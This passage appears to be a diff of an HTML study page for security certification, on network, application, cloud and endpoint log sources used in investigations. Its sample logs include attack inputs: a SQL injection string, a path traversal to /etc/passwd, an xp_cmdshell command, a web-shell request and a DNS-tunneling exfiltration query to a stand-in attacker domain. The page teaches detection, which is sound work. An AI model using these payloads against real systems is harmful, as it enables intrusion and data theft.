+<!-- 3. NETWORK LOGS           -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s3">
+<div class="card">
+  <div class="card-hd"><span class="card-num">03</span><span class="card-title">Network Log Sources</span><span class="bdg bdg-green">Firewall · NetFlow · DNS · PCAP</span></div>
+  <div class="card-bd">
+    <p>Network logs reveal <strong style="color:var(--text)">who communicated with whom, when, how much data moved, and which protocols were used</strong>. Even when endpoint logs are unavailable or tampered with, network logs preserve the communication record.</p>
+
+    <div class="log-card" style="border-left-color:var(--blue)">
+      <div class="log-hd">
+        <span class="log-icon">🔥</span>
+        <span class="log-name" style="color:var(--blue)">Firewall Logs</span>
+        <span class="log-badge">Allow + Deny records</span>
+      </div>
+      <div class="log-body">Records every connection attempt — allowed and denied. Shows: source IP, destination IP, port, protocol, bytes transferred, duration, rule matched. Essential for: identifying C2 connections, data exfiltration volume, port scanning, unauthorized access attempts. Inbound denies reveal reconnaissance; outbound allows reveal data movement.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># Firewall log format (Palo Alto NGFW):</span>
+2024-03-15 02:14:33 <span class="cb">ALLOW</span> tcp 10.0.0.47:54231 → 8.8.8.8:443
+  bytes_sent:847 bytes_recv:12047 duration:4s app:ssl
+
+2024-03-15 02:17:44 <span class="cg">DENY</span>  tcp 10.0.0.47:53291 → 185.220.101.34:4444
+  reason:threat-detected category:c2-communication
+
+<span class="cm"># Investigating data exfiltration — firewall log query:</span>
+Source: internal (10.0.0.0/8)
+Action: ALLOW
+Bytes_sent: > 100MB
+Destination: NOT internal
+Time: 22:00 to 06:00  ← after hours!
+<span class="cr">Result: 847MB sent to 104.21.15.32 at 2am ← investigate</span>
+      </div>
+    </div>
+
+    <div class="log-card" style="border-left-color:var(--teal)">
+      <div class="log-hd">
+        <span class="log-icon">📊</span>
+        <span class="log-name" style="color:var(--teal)">NetFlow / IPFIX</span>
+        <span class="log-badge">Traffic metadata — not content</span>
+      </div>
+      <div class="log-body">Records conversation metadata for every network flow. Shows: who talked to whom, how much data, what protocol, how long — but NOT the actual content. Lightweight — store months of data where PCAP would be impractical. Essential for: detecting data exfiltration by volume, identifying lateral movement patterns, spotting C2 beaconing by timing regularity.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># NetFlow record — connection metadata:</span>
+SrcIP:10.0.4.22  DstIP:185.220.x.x  SrcPort:49832  DstPort:443
+Proto:TCP  Bytes:4,793,244,800  Pkts:3,247,891
+Start:2024-03-10 01:14:22  End:2024-03-10 01:52:44
+Duration:38min  Direction:outbound
+
+<span class="cm"># 4.7 GB sent to suspicious IP at 1am = exfiltration indicator</span>
+
+<span class="cm"># NetFlow beaconing detection:</span>
+Src:10.0.1.47 → Dst:evil-c2.com:443
+Connections every: 5min 00sec ± 3sec  ← too regular = C2
+28 connections over 2.5 hours
+<span class="cr">= Malware C2 beaconing pattern detected</span>
+
+<span class="cm"># Tools: SolarWinds NTA, ntopng, Cisco Stealthwatch</span>
+<span class="cm"># Protocol: NetFlow v5/v9 (Cisco), IPFIX (standard)</span>
+      </div>
+    </div>
+
+    <div class="log-card" style="border-left-color:var(--orange)">
+      <div class="log-hd">
+        <span class="log-icon">🌐</span>
+        <span class="log-name" style="color:var(--orange)">DNS Logs</span>
+        <span class="log-badge">Domain resolution records</span>
+      </div>
+      <div class="log-body">Every domain lookup recorded — timestamp, querying host, domain queried, response. Invaluable for investigations because: malware must resolve C2 domains, DNS tunneling creates unusual query patterns, DGA malware generates many failed lookups, DNS logs persist even after endpoint compromise.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># DNS log entries:</span>
+2024-03-15 02:14:31 10.0.1.47 QUERY  evil-c2-server.ru → <span class="cr">NXDOMAIN</span>
+2024-03-15 02:14:32 10.0.1.47 QUERY  a1b2c3d4e5.evil.ru → 185.220.101.34
+2024-03-15 02:14:37 10.0.1.47 QUERY  f6g7h8i9j0.evil.ru → 185.220.101.34
+2024-03-15 02:14:42 10.0.1.47 QUERY  k1l2m3n4o5.evil.ru → 185.220.101.34
+
+<span class="cm"># DGA pattern: many unique subdomains → same domain</span>
+<span class="cm"># = Domain Generation Algorithm malware ← investigate 10.0.1.47</span>
+
+<span class="cm"># DNS tunneling detection:</span>
+2024-03-15 02:34:12 10.0.3.88 QUERY
+  c2VjcmV0ZGF0YWhlcmU=.exfil.attacker.com
+  <span class="cm"># Base64 encoded data IN the DNS query name</span>
+  <span class="cr"># = DNS tunneling exfiltration detected</span>
+
+<span class="cm"># What DNS logs reveal that firewall logs miss:</span>
+HTTPS to bad IP blocked by firewall?
+DNS query still logged BEFORE firewall drops it ✓
+      </div>
+    </div>
+
+    <div class="log-card" style="border-left-color:var(--purple)">
+      <div class="log-hd">
+        <span class="log-icon">📦</span>
+        <span class="log-name" style="color:var(--purple)">Packet Capture (PCAP)</span>
+        <span class="log-badge">Full content — investigation gold</span>
+      </div>
+      <div class="log-body">Full packet capture contains the actual data — headers AND payload. Can reconstruct: exact malware downloaded, credentials transmitted in plaintext, commands sent to compromised host, data exfiltrated. High storage cost — not continuous on all links. Triggered capture on suspicious activity is common approach.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># Wireshark analysis of suspected C2 traffic:</span>
+Filter: ip.addr == 185.220.101.34
+
+Frame 1: TCP SYN → connection established
+Frame 2: TLS ClientHello → encrypted channel established
+  Server name: definitely-not-evil.com
+  Certificate: self-signed, 1 day old ← suspicious
+Frame 3-N: encrypted data exchange
+
+<span class="cm"># With SSL inspection (NGFW):</span>
+Decrypted payload reveals:
+  POST /gate.php HTTP/1.1
+  {"cmd":"whoami","host":"WORKSTATION-47","user":"sarah.chen"}
+  <span class="cr">= Active C2 communication — command and control confirmed</span>
+
+<span class="cm"># PCAP tools: Wireshark, tcpdump, NetworkMiner, Zeek/Bro</span>
+<span class="cm"># Storage: 1Gbps link = ~450GB/hour — selective capture only</span>
+      </div>
+    </div>
+
+    <div class="log-card" style="border-left-color:var(--green)">
+      <div class="log-hd">
+        <span class="log-icon">📍</span>
+        <span class="log-name" style="color:var(--green)">DHCP Logs</span>
+        <span class="log-badge">IP-to-host mapping</span>
+      </div>
+      <div class="log-body">Maps IP addresses to hostnames and MAC addresses at specific times. Critical for: identifying "which device had this IP at 2am?", detecting rogue devices (unknown MACs), tracking device movement around network, resolving IP addresses in other logs to hostnames.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># Investigation: firewall log shows 10.0.1.47 exfiltrating data at 2am</span>
+<span class="cm"># DHCP log tells us which device that was:</span>
+
+2024-03-15 01:47:22 DHCPACK 10.0.1.47 → MAC:aa:bb:cc:dd:ee:ff
+  Hostname: LAPTOP-SARAHCHEN
+  Lease: 8 hours
+
+<span class="cg">Answer: Sarah Chen's laptop had that IP at 2am ✓</span>
+<span class="cm"># Without DHCP logs: "some device had IP 10.0.1.47" — useless</span>
+<span class="cm"># With DHCP logs: "Sarah Chen's laptop" — actionable</span>
+      </div>
+    </div>
+
+    <div class="log-card" style="border-left-color:var(--indigo)">
+      <div class="log-hd">
+        <span class="log-icon">🔗</span>
+        <span class="log-name" style="color:var(--indigo)">Proxy / Web Filtering Logs</span>
+        <span class="log-badge">Web access records</span>
+      </div>
+      <div class="log-body">Records all web requests made through the corporate proxy — URL, user, timestamp, bytes, category, action. Even for HTTPS — proxy sees the URL (SNI) even if not decrypting. Catches: malware callbacks, data upload to cloud services, policy violations, credential theft via phishing site visits.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># Proxy log — Squid/Zscaler/Bluecoat format:</span>
+2024-03-15 14:23:47 ALLOWED <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a1d2c0d3c0c98fc2c9c4cfe1c2ceccd1c0cfd88fc2cecc">[email&#160;protected]</a>
+  GET https://mail.google.com/  — 200 OK — 47KB
+  Category: Web-based Email
+
+2024-03-15 14:24:12 BLOCKED <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="07746675666f29646f62694764686a7766697e2964686a">[email&#160;protected]</a>
+  GET https://credential-harvester.evil.com/login
+  Category: Phishing — Action: BLOCKED
+  <span class="cr">User attempted to visit known phishing site</span>
+
+2024-03-15 02:17:33 ALLOWED (user not identified — after hours)
+  POST https://transfer.sh/upload — 847MB uploaded
+  Category: File Sharing — Action: <span class="cr">SHOULD HAVE BLOCKED</span>
+      </div>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// Scenario — Network Logs Reconstruct Breach</div>
+      <div class="code">
+<span class="cm"># No endpoint evidence (server reimaged) — network logs save the day:</span>
+
+<span class="cb">DNS logs:</span>
+  Day -45: LAPTOP-047 resolved malware-dropper.ru → got IP
+  Day -44: LAPTOP-047 DNS queries → DGA pattern (100+ unique domains)
+  Day -44: confirmed-C2.ru → 185.220.x.x (47 daily queries)
+
+<span class="cb">Firewall logs:</span>
+  Day -44: LAPTOP-047 → 185.220.x.x:443 → ALLOWED (looks like HTTPS)
+  Day -44: LAPTOP-047 lateral → FILE-SERVER-02 SMB → ALLOWED
+  Day -10: FILE-SERVER-02 → FILE-SERVER-01 SMB → ALLOWED
+  Day -10: FILE-SERVER-01 → DC-01 LDAP → ALLOWED
+
+<span class="cb">NetFlow:</span>
+  Day -8: DC-01 → 185.220.x.x → 47GB transferred overnight
+  <span class="cr">= AD database exfiltrated (DC + 47GB = likely ntds.dit)</span>
+
+<span class="cb">Proxy logs:</span>
+  Day -45: sarah.chen → malware-dropper.ru/office-update.exe → 200 OK
+  <span class="co">= initial infection via drive-by download</span>
+
+<span class="cg">Complete attack chain reconstructed from network logs alone:</span>
+<span class="cg">Drive-by → C2 → lateral movement → domain → AD exfil ✓</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">Firewall logs →</span><span>Allow/deny records — show connections attempted and made</span></div>
+      <div class="er"><span class="ek">NetFlow →</span><span>Traffic metadata (not content) — who talked to whom, how much, when — IPFIX standard</span></div>
+      <div class="er"><span class="ek">DNS logs →</span><span>Domain resolution records — detects C2 domains, DGA, DNS tunneling</span></div>
+      <div class="er"><span class="ek">PCAP →</span><span>Full packet content — Wireshark — highest investigation value, highest storage cost</span></div>
+      <div class="er"><span class="ek">DHCP logs →</span><span>Maps IP to hostname/MAC at specific time — identifies which device had an IP</span></div>
+      <div class="er"><span class="ek">Proxy logs →</span><span>Web requests — URL, user, action — even HTTPS shows URL via SNI</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 4. APP & SERVICE LOGS     -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s4">
+<div class="card">
+  <div class="card-hd"><span class="card-num">04</span><span class="card-title">Application & Service Logs</span><span class="bdg bdg-orange">Web · Database · Email · VPN</span></div>
+  <div class="card-bd">
+    <p>Application logs record <strong style="color:var(--text)">what users and systems actually did inside applications</strong>. They reveal the "what" and "how" of an attack that network logs can't show — SQL queries run, web pages accessed, emails sent, files downloaded.</p>
+
+    <div class="log-card" style="border-left-color:var(--orange)">
+      <div class="log-hd">
+        <span class="log-icon">🌍</span>
+        <span class="log-name" style="color:var(--orange)">Web Server Access Logs</span>
+        <span class="log-badge">Apache · Nginx · IIS</span>
+      </div>
+      <div class="log-body">Every HTTP/HTTPS request to a web server logged — source IP, timestamp, method, URL, status code, bytes, user-agent. Critical for: detecting web attacks (SQLi, XSS, directory traversal), identifying compromised pages, finding C2 web shells, discovering data exfiltration via HTTP POST.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># Apache/Nginx Combined Log Format:</span>
+185.220.101.34 - - [15/Mar/2024:02:14:33 +0000]
+  "GET /wp-admin/admin-ajax.php?action=test HTTP/1.1"
+  200 47 "http://attacker.com" "Mozilla/5.0 Nikto/2.1.6"
+<span class="cm"># User-agent "Nikto" = vulnerability scanner!</span>
+
+<span class="cr"># SQL injection attempt:</span>
+192.168.1.100 - - [15/Mar/2024:14:23:07 +0000]
+  "GET /products?id=1'+OR+'1'='1 HTTP/1.1" 200 8472
+<span class="cm"># URL contains SQL injection payload in query parameter</span>
+
+<span class="cr"># Web shell access:</span>
+185.220.101.34 - - [15/Mar/2024:03:47:22 +0000]
+  "POST /uploads/image.php.jpg HTTP/1.1" 200 127
+<span class="cm"># POST to uploaded file = web shell execution</span>
+
+<span class="cr"># Directory traversal:</span>
+10.0.0.1 - - [15/Mar/2024:11:22:00 +0000]
+  "GET /download?file=../../etc/passwd HTTP/1.1" 200 1847
+      </div>
+    </div>
+
+    <div class="log-card" style="border-left-color:var(--red)">
+      <div class="log-hd">
+        <span class="log-icon">🗄️</span>
+        <span class="log-name" style="color:var(--red)">Database Logs</span>
+        <span class="log-badge">Query audit · Access records</span>
+      </div>
+      <div class="log-body">Database audit logs record who ran what queries, when, from where, and what data was returned. Detects: SQL injection that reached the database, unauthorized bulk data exports, privileged stored procedure execution (xp_cmdshell), database account misuse, schema changes.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># SQL Server Audit Log:</span>
+2024-03-15 02:14:47 | session=847 | login=webapp_user
+  from=10.0.0.1 | query:
+  SELECT * FROM customers WHERE 1=1 -- (SQL injection)
+  rows_returned: 250,847  ← <span class="cr">entire customer table dumped</span>
+
+<span class="cm"># Suspicious stored procedure:</span>
+2024-03-15 02:17:01 | session=891 | login=sa_account
+  query: EXEC xp_cmdshell 'whoami'  ← <span class="cr">OS command execution!</span>
+  result: 'NT AUTHORITY\SYSTEM'
+
+<span class="cm"># Privilege escalation via DB:</span>
+2024-03-15 02:18:33 | login=sa_account
+  query: ALTER LOGIN admin ENABLE; ← <span class="cr">re-enabling disabled account</span>
+      </div>
+    </div>
+
+    <div class="log-card" style="border-left-color:var(--purple)">
+      <div class="log-hd">
+        <span class="log-icon">📧</span>
+        <span class="log-name" style="color:var(--purple)">Email Logs</span>
+        <span class="log-badge">Message tracking · Gateway</span>
+      </div>
+      <div class="log-body">Email gateway and server logs record every message — sender, recipients, subject, attachments, routing, actions taken. Essential for: tracing phishing campaigns, investigating BEC fraud, finding data exfiltration via email, identifying compromised accounts sending spam/phishing internally.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># Exchange/O365 Message Tracking Log:</span>
+2024-03-15 14:23:47 | MessageId: &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="452427267477760520332c296b262a28">[email&#160;protected]</a>&gt;
+  Sender: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="83e1ecf0f0c3f0f3ecece5e6e7aee0eceef3e2edfaade0ecee">[email&#160;protected]</a>
+  Recipients: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="02646b6c636c616742616d6f72636c7b2c616d6f">[email&#160;protected]</a>
+  Subject: "Urgent Wire Transfer Request"
+  Attachment: Invoice_March.zip (contains macro)
+  Action: DELIVERED  ← <span class="cr">should have been blocked</span>
+
+<span class="cm"># Compromised account sending phishing:</span>
+2024-03-15 22:47:01 | Sender: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b0c3d1c2d1d89ed3d8d5def0d3dfddc0d1dec99ed3dfdd">[email&#160;protected]</a>
+  Recipients: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3e5f5252134d4a5f58587e5d51534e5f5047105d5153">[email&#160;protected]</a> (500 recipients!)
+  Subject: "Check this out"
+  Attachment: malware.exe
+  IP: 185.220.101.34  ← <span class="cr">NOT Sarah's normal IP = compromised</span>
+
+<span class="cm"># Mass email forwarding (insider threat / BEC):</span>
+Forwarding rule: ALL MAIL → <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3e5f4a4a5f5d555b4c7e59535f5752105d5153">[email&#160;protected]</a>
+  Created: 2024-03-10 (5 days ago — missed)
+      </div>
+    </div>
+
+    <div class="log-card" style="border-left-color:var(--teal)">
+      <div class="log-hd">
+        <span class="log-icon">🔐</span>
+        <span class="log-name" style="color:var(--teal)">VPN and Remote Access Logs</span>
+        <span class="log-badge">Connection records</span>
+      </div>
+      <div class="log-body">Records VPN connections — username, source IP, connection time, session duration, bytes transferred. Critical for: impossible travel detection (two countries same time), detecting use of compromised credentials, identifying unauthorized after-hours access, tracking remote worker activity.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># VPN access log:</span>
+2024-03-15 09:14:22 | CONNECT | user:john.smith
+  source_ip: 96.127.x.x (Toronto, Canada)
+  duration: 8hr 42min | bytes: 2.1GB
+
+2024-03-15 11:47:33 | CONNECT | user:john.smith  ← <span class="cr">SAME USER</span>
+  source_ip: 194.165.x.x (Moscow, Russia) ← <span class="cr">SAME TIME</span>
+  <span class="cr">Impossible travel! John can't be in Canada AND Russia</span>
+
+<span class="cm"># After-hours access pattern:</span>
+user:sarah.chen normally: Mon-Fri 8am-6pm EST
+2024-03-15 02:14:33 CONNECT sarah.chen
+  source: 185.220.x.x — 2am Sunday
+  <span class="cr">= Credential compromise or insider threat</span>
+      </div>
+    </div>
+
+    <div class="log-card" style="border-left-color:var(--blue)">
+      <div class="log-hd">
+        <span class="log-icon">📜</span>
+        <span class="log-name" style="color:var(--blue)">Authentication / IAM Logs</span>
+        <span class="log-badge">SSO · MFA · Directory</span>
+      </div>
+      <div class="log-body">Identity provider logs — Okta, Azure AD, Active Directory — record every authentication event across all connected applications. One stop for: all login events, MFA outcomes, SSO token issuance, suspicious sign-in patterns, conditional access policy outcomes.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># Azure AD / Okta sign-in log:</span>
+2024-03-15 02:14:33 | user:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ddaebcafbcb5f3beb5b8b39dbeb2b0adbcb3a4f3beb2b0">[email&#160;protected]</a>
+  app: Microsoft 365 | ip:185.220.101.34
+  location: Netherlands (new) | device: unknown
+  MFA: required — <span class="cr">FAILED (user denied push)</span>
+  risk_level: HIGH | result: BLOCKED
+
+2024-03-15 02:17:12 | user:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="25564457444d0b464d404b65464a4855444b5c0b464a48">[email&#160;protected]</a>
+  app: Microsoft 365 | ip:185.220.101.34
+  MFA: required — <span class="cr">APPROVED ← MFA fatigue — user approved!</span>
+  result: SUCCESS | <span class="cr">account compromised</span>
+
+<span class="cm"># Password spray detected in IAM logs:</span>
+02:14-02:15 | 500 different users, 1 failed attempt each
+All from: same IP range (185.220.0.0/16)
+<span class="cr">= Password spray attack</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">Web server logs →</span><span>Apache/Nginx — URL, status code, source IP — detect SQLi, web shells, directory traversal</span></div>
+      <div class="er"><span class="ek">Database logs →</span><span>Query audit — detect bulk dumps, xp_cmdshell, unauthorized queries</span></div>
+      <div class="er"><span class="ek">Email logs →</span><span>Message tracking — sender, recipient, attachment — phishing + BEC investigation</span></div>
+      <div class="er"><span class="ek">VPN logs →</span><span>Connection records — impossible travel detection, after-hours access</span></div>
+      <div class="er"><span class="ek">IAM/SSO logs →</span><span>All auth across all apps — MFA outcomes, risk scoring, conditional access</span></div>
+      <div class="er"><span class="ek">xp_cmdshell →</span><span>SQL Server stored procedure executing OS commands — critical alert in DB logs</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 5. CLOUD & IDENTITY LOGS  -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s5">
+<div class="card">
+  <div class="card-hd"><span class="card-num">05</span><span class="card-title">Cloud & Identity Logs</span><span class="bdg bdg-purple">CloudTrail · Azure · SaaS</span></div>
+  <div class="card-bd">
+    <p>Cloud environments generate their own audit trails — <strong style="color:var(--text)">every API call, resource creation, configuration change, and access event is logged</strong>. Cloud logs are often more comprehensive than on-premises logs because cloud providers build logging into every action by default.</p>
+
+    <div class="log-card" style="border-left-color:var(--orange)">
+      <div class="log-hd">
+        <span class="log-icon">☁️</span>
+        <span class="log-name" style="color:var(--orange)">AWS CloudTrail</span>
+        <span class="log-badge">Every API call logged</span>
+      </div>
+      <div class="log-body">Records every AWS API call — who called what, from where, at what time. Captures: console logins, CLI commands, SDK calls, changes to every AWS resource. If it happened in AWS — CloudTrail has a record. Critical to enable in ALL regions and ensure logs are shipped to separate account (attacker can't delete them).</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># CloudTrail — high-value investigation events:</span>
+
+<span class="cr">Root account login (should NEVER happen normally):</span>
+  eventName: ConsoleLogin | userType: Root
+  sourceIPAddress: 185.220.101.34  ← immediate alert!
+
+<span class="cr">Security controls disabled:</span>
+  eventName: StopLogging  ← CloudTrail disabled — cover tracks!
+  eventName: DeleteTrail  ← evidence destruction attempt
+
+<span class="cr">New admin created:</span>
+  eventName: CreateUser | userName: backdoor-admin
+  eventName: AttachUserPolicy | policyName: AdministratorAccess
+
+<span class="cr">S3 data exfiltration:</span>
+  eventName: GetObject | bucketName: company-sensitive-data
+  requester: backdoor-admin | count: 50,000 requests in 10min
+
+<span class="cr">EC2 crypto-mining:</span>
+  eventName: RunInstances | instanceType: p3.16xlarge (GPU!)
+  tag: none | region: us-east-1 (unusual region for org)
+
+<span class="cm"># AWS GuardDuty — automated threat detection on CloudTrail</span>
+<span class="cm"># correlates with VPC Flow Logs and DNS logs</span>
+      </div>
+    </div>
+
+    <div class="log-card" style="border-left-color:var(--blue)">
+      <div class="log-hd">
+        <span class="log-icon">🔷</span>
+        <span class="log-name" style="color:var(--blue)">Azure Activity Log & Entra ID</span>
+        <span class="log-badge">Azure operations · Identity</span>
+      </div>
+      <div class="log-body">Azure Activity Log records all control plane operations — VM creation, security group changes, policy updates. Azure Entra ID (formerly Azure AD) sign-in logs and audit logs record all authentication and directory changes. Microsoft 365 Unified Audit Log covers all M365 services.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># Azure/M365 high-value log sources:</span>
+Azure Activity Log:
+  ResourceGroup deleted | who | when
+  NetworkSecurityGroup rule added (open port 0.0.0.0/0!)
+  VirtualMachine created (unexpected region)
+  KeyVault secret accessed
+
+Azure Entra ID Sign-in Log:
+  riskLevel: high | riskEventTypes: unfamiliarFeatures
+  location: (varies) | mfaResult: failed
+
+M365 Unified Audit Log:
+  MailboxLogin from new IP after hours
+  FileAccessed: employee-salary-data.xlsx
+  AnonymousLinkCreated: HR-records.zip → <span class="cr">exfil attempt</span>
+  InboxRuleCreated: forward all to external → <span class="cr">BEC indicator</span>
+      </div>
+    </div>
+
+    <div class="log-card" style="border-left-color:var(--teal)">
+      <div class="log-hd">
+        <span class="log-icon">📋</span>
+        <span class="log-name" style="color:var(--teal)">SaaS Application Audit Logs</span>
+        <span class="log-badge">Salesforce · GitHub · Slack</span>
+      </div>
+      <div class="log-body">Every major SaaS platform provides audit logs via their admin console or API. These are increasingly important as more business happens in cloud apps. Integration with SIEM is essential — SaaS audit logs sitting in vendor console are hard to correlate with other events.</div>
+      <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># Key SaaS audit log sources and what they reveal:</span>
+
+<span class="cb">Salesforce Event Monitoring:</span>
+  User exported: 500,000 contact records → CSV
+  Login from new IP at 3am
+  Admin created new API credential
+
+<span class="cl">GitHub Audit Log:</span>
+  Repository cloned by external IP
+  Branch protection disabled → force push to main
+  New deploy key added → backdoor persistence
+  Secret scanning: AWS key found in commit!
+
+<span class="cpk">Slack Audit Log:</span>
+  File downloaded: confidential-acquisition.pdf
+  New app installed by non-admin
+  User exported channel history before leaving company
+
+<span class="co">Okta System Log:</span>
+  Multiple failed MFA — then success (MFA fatigue)
+  New SAML app configured → SSO to unknown app
+  API token created → automation or persistence
+      </div>
+    </div>
+
+    <h3>Cloud Log Architecture Best Practices</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--orange)">Enable Logging Everywhere</h4>
+        <p>CloudTrail: enable in ALL regions (not just primary). VPC Flow Logs: on every VPC. S3 server access logging. Load balancer logs. Lambda function logs. Default: many cloud services log nothing until you enable it.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--red)">Protect Cloud Logs from Deletion</h4>
+        <p>Ship CloudTrail logs to separate AWS account with strict IAM. Attacker who compromises your account cannot delete logs in a different account. Enable S3 Object Lock (WORM) on log buckets. Alert on any attempt to disable logging.</p>
+        <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+CloudTrail StopLogging event = <span class="cr">CRITICAL ALERT</span>
+Delete S3 log bucket = <span class="cr">CRITICAL ALERT</span>
+Modify log bucket policy = <span class="cr">HIGH ALERT</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">CloudTrail →</span><span>Every AWS API call logged — enable all regions — store in separate account</span></div>
+      <div class="er"><span class="ek">StopLogging →</span><span>Attacker disabling CloudTrail — critical alert — evidence destruction</span></div>
+      <div class="er"><span class="ek">GuardDuty →</span><span>AWS automated threat detection — analyzes CloudTrail + VPC Flow + DNS</span></div>
+      <div class="er"><span class="ek">Azure Activity Log →</span><span>Control plane ops — resource creation, security changes</span></div>
+      <div class="er"><span class="ek">M365 Unified Audit Log →</span><span>All Microsoft 365 events — email, SharePoint, Teams, OneDrive</span></div>
+      <div class="er"><span class="ek">SaaS audit logs →</span><span>Salesforce, GitHub, Slack — integrate with SIEM for correlation</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 6. ENDPOINT LOGS          -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s6">
+<div class="card">
+  <div class="card-hd"><span class="card-num">06</span><span class="card-title">Endpoint Logs & EDR Telemetry</span><span class="bdg bdg-teal">Process · File · Registry · Network</span></div>
+  <div class="card-bd">
+    <p>Endpoint logs provide <strong style="color:var(--text)">granular visibility into what happened on individual systems</strong> — far more detail than network logs can provide. EDR agents collect continuous behavioral telemetry that traditional event logs miss.</p>
+
+    <h3>Sysmon — Enhanced Windows Logging</h3>
+    <div class="info-row">
+      <div class="info-icon">🔬</div>
+      <div>
+        <div class="info-title">What Is Sysmon?</div>
+        <div class="info-desc">System Monitor (Sysmon) is a free Windows Sysinternals tool that provides far more detailed logging than standard Windows Event Log. Captures: process creation with command lines, network connections, file creation timestamps, driver loading, registry changes, named pipe activity. Essential for security monitoring — many SOCs consider it mandatory. Free from Microsoft.</div>
+      </div>
+    </div>
+    <div class="code" style="font-size:0.64rem">
+<span class="cm"># Sysmon event IDs — key ones for investigations:</span>
+Event ID 1:  Process Creation
+  <span class="cg">→ full command line, parent process, hash, user context</span>
+Event ID 3:  Network Connection
+  <span class="cg">→ process making connection, destination IP, port, DNS name</span>
+Event ID 7:  Image (DLL) Loaded
+  <span class="cg">→ DLL injection detection</span>
+Event ID 8:  CreateRemoteThread
+  <span class="cg">→ thread injection into another process — classic malware technique</span>
+Event ID 10: ProcessAccess (LSASS access)
+  <span class="cg">→ credential dumping detection (Mimikatz reads LSASS)</span>
+Event ID 11: FileCreate
+  <span class="cg">→ new file created — dropped malware, web shells</span>
+Event ID 13: Registry Value Set
+  <span class="cg">→ persistence via registry Run keys</span>
+Event ID 15: FileCreateStreamHash (Alternate Data Streams)
+  <span class="cg">→ malware hiding in ADS</span>
+Event ID 22: DNS Query
+  <span class="cg">→ which process made which DNS query (C2 detection)</span>
+
+<span class="cm"># Example Sysmon Event 1 — process creation:</span>
+EventID: 1 | Image: C:\Windows\Temp\malware.exe
+  CommandLine: malware.exe -c "powershell -enc [base64]"
+  ParentImage: C:\Users\sarah\Downloads\invoice.pdf.exe
+  User: COMPANY\sarah.chen
+  Hashes: MD5=deadbeef1234,SHA256=abc123...
+  <span class="cr">→ PDF spawning executable = malware ← high confidence</span>
+    </div>
+
+    <h3>EDR Telemetry vs Traditional Logs</h3>
+    <div style="overflow-x:auto;margin:1rem 0">
+    <table>
+      <tr><th>Data Point</th><th>Windows Event Log</th><th>Sysmon</th><th>EDR (CrowdStrike/Defender)</th></tr>
+      <tr><td>Process creation</td><td><span class="tag ty">Basic (4688)</span></td><td><span class="tag tg">With cmd + hash</span></td><td><span class="tag tg">Full tree + behavior</span></td></tr>
+      <tr><td>Network connections</td><td><span class="tag tr">No</span></td><td><span class="tag tg">Yes (Event 3)</span></td><td><span class="tag tg">Yes + threat intel</span></td></tr>
+      <tr><td>File changes</td><td><span class="tag ty">If auditing on</span></td><td><span class="tag tg">Yes (Event 11)</span></td><td><span class="tag tg">Yes + classification</span></td></tr>
+      <tr><td>Registry changes</td><td><span class="tag ty">If auditing on</span></td><td><span class="tag tg">Yes (Event 13)</span></td><td><span class="tag tg">Yes + context</span></td></tr>
+      <tr><td>Lateral movement</td><td><span class="tag tr">Partial</span></td><td><span class="tag ty">Partial</span></td><td><span class="tag tg">Full detection</span></td></tr>
+      <tr><td>Fileless malware</td><td><span class="tag tr">No</span></td><td><span class="tag ty">Partial</span></td><td><span class="tag tg">Yes (memory scanning)</span></td></tr>
+      <tr><td>Behavioral analysis</td><td><span class="tag tr">No</span></td><td><span class="tag tr">No</span></td><td><span class="tag tg">Yes (AI/ML)</span></td></tr>
+      <tr><td>Cost</td><td><span class="tag tg">Free (built-in)</span></td><td><span class="tag tg">Free (Sysinternals)</span></td><td><span class="tag tr">Commercial license</span></td></tr>
+    </table>
+    </div>
+
+    <h3>PowerShell Script Block Logging</h3>
+    <div class="code">
